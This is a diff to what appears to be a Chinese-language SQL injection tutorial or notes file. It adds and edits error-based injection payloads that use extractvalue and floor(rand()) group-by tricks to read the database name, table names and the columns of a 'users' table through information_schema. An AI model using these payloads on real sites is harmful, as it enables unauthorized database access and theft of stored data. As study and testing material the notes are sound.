@@ -553,6 +553,16 @@ limit 0,1 是从第零行开始查询 1 行
 ?id=100' union select 1,extractvalue(1,concat(0x7e,(select database()))),3 --+
 ```
 
+```
+?id=100' UNION SELECT 1,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),3 --+
+```
+
+```
+?id=100' UNION SELECT 1,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))),3 --+
+```
+
+
+
 ```sql
 ?id=100' union 1=extractvalue(1,concat(0x7e,(select database()))),3 --+
 ```
@@ -570,7 +580,7 @@ concat_ws 作用是连接
 使用 group_concat 无法显示可以使用 concat
 
 ```
-?id=0' union select 1,count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2))as a from information_schema.tables group by a --+
+?id=0' union select 1,2,count(*),concat_ws('-',(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand(0)*2))as a from information_schema.tables group by a --+
 ```
 
 ```
